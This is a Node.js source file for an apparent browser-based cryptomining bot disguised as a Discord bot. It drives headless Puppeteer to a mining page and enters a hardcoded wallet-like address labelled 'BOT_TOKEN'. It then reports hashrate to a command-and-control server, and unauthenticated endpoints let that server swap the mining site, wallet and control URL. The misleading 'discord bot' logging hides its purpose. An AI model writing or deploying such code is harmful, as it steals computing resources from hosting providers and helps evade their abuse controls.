const express = require("express");
const puppeteer = require("puppeteer");
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

dotenv.config();

const app = express();
app.use(express.json());

const botId = process.env.BOT_ID;
let controlServerUrl = process.env.CONTROL_SERVER_URL;
let controlServerUrlErrorLogged = false;

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

let page;
let browser;
let puppeteerError = null;
let pageTitle = '';
let startTime;
let HValue = '--';

async function startBrowser() {
  try {
    browser = await puppeteer.launch({
    args: [
      "--disable-setuid-sandbox",
      "--no-sandbox",
      "--single-process",
      "--no-zygote",
    ],
    executablePath:
      process.env.NODE_ENV === "production"
        ? process.env.PUPPETEER_EXECUTABLE_PATH
        : puppeteer.executablePath(),
    headless: true,
  });
    const pages = await browser.pages();
    page = pages[0];

    const url = process.env.WEBSITE || "https://enshrined-scarce-jersey.glitch.me";
    await page.goto(url, { waitUntil: "domcontentloaded" });
    await delay(2000);

    const inputSelector = '#AddrField';
    const BOTID = process.env.BOT_TOKEN || '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';

    await page.type(inputSelector, BOTID);
    await page.keyboard.press("Enter");
    await delay(2000);

    await page.click('#WebBtn');
    pageTitle = await page.title();
    console.log(pageTitle);
    console.log(`Started discord bot on server ${botId}`);

    startTime = new Date();

    // Start monitoring the H value
    setInterval(async () => {
      try {
        HValue = await page.$eval('#WebH', el => el.textContent);
        console.log(`Hs: ${HValue}`);
      } catch (error) {
        console.error('Error fetching Hvalue:', error.message);
      }
    }, 5000);

  } catch (err) {
    puppeteerError = err.message;
    console.error('Error in startBrowser:', err.message);
  }
}

function getUptime() {
  if (!startTime) return null;
  const now = new Date();
  const diff = now - startTime;
  const diffInSeconds = Math.floor(diff / 1000);
  const hours = Math.floor(diffInSeconds / 3600);
  const minutes = Math.floor((diffInSeconds % 3600) / 60);
  const seconds = diffInSeconds % 3600 % 60;
  return `${hours}h ${minutes}m ${seconds}s`;
}

async function sendStatusToControlServer() {
  if (!controlServerUrl || !/^https?:\/\/.+/i.test(controlServerUrl)) {
    if (!controlServerUrlErrorLogged) {
      console.error('Invalid or missing control server URL.');
      controlServerUrlErrorLogged = true; // Set the flag to true after logging the error
    }
    return;
  }

  controlServerUrlErrorLogged = false; // Reset the flag if the URL is valid

  const status = {
    active: !puppeteerError,
    uptime: getUptime(),
    hashrate: HValue,
    error: puppeteerError,
    pageTitle
  };

  try {
    await axios.post(`${controlServerUrl}/update`, {
      serverId: botId,
      status
    });
    console.log(`Status sent to control server: ${JSON.stringify(status)}`);
  } catch (error) {
    console.error('Error sending status to control server:', error.message);
  }
}

function updateEnvVariable(key, value) {
  const envFilePath = path.resolve(__dirname, '.env');
  const envConfig = dotenv.parse(fs.readFileSync(envFilePath));

  envConfig[key] = value;

  const updatedEnvConfig = Object.keys(envConfig).map(k => `${k}=${envConfig[k]}`).join('\n');
  fs.writeFileSync(envFilePath, updatedEnvConfig);
  dotenv.config(); // reload the environment variables
}

app.post('/update-control-server-url', (req, res) => {
  const { newUrl } = req.body;
  if (!newUrl) {
    return res.status(400).send({ error: "newUrl is required" });
  }
  updateEnvVariable('CONTROL_SERVER_URL', newUrl);
  controlServerUrl = newUrl;
  controlServerUrlErrorLogged = false; // Reset the error flag when updating the URL
  res.send({ success: true, newUrl });
});

app.post('/update-website', (req, res) => {
  const { newWebsite } = req.body;
  if (!newWebsite) {
    return res.status(400).send({ error: "newWebsite is required" });
  }
  updateEnvVariable('WEBSITE', newWebsite);
  res.send({ success: true, newWebsite });
});

app.post('/update-bot-token', (req, res) => {
  const { newBot_Token } = req.body;
  if (!newBot_Token) {
    return res.status(400).send({ error: "Bot Token is required" });
  }
  updateEnvVariable('BOT_TOKEN', newBot_Token);
  res.send({ success: true, newBot_Token });
});

app.get('/', (req, res) => {
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
  const botIdMatches = uuidRegex.test(process.env.BOT_ID);
  const batchCorrect = process.env.BATCH === 'ALPHA';

  const response = {
    BOT_ID: botIdMatches ? "SET" : "NOT SET",
    BATCH: batchCorrect ? "SET" : "NOT SET",
  };

  if (puppeteerError) {
    response.error = puppeteerError;
  } else {
    response.success = true;
    response.pageTitle = pageTitle;
    response.uptime = getUptime();
    response.Hs = HValue;
  }

  res.send(response);
});

// Start the main function to keep the Puppeteer browser running
startBrowser();

// Send regular updates to the control server
setInterval(sendStatusToControlServer, 20000); // every 20 seconds

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log(`Your app is listening on port ${listener.address().port}`);
});

// Gracefully close the browser on process termination
process.on('SIGINT', async () => {
  console.log('Closing the browser...');
  await browser?.close();
  process.exit(0);
}); 

process.on('SIGTERM', async () => {
  console.log('Closing the browser...');
  await browser?.close();
  process.exit(0);
});
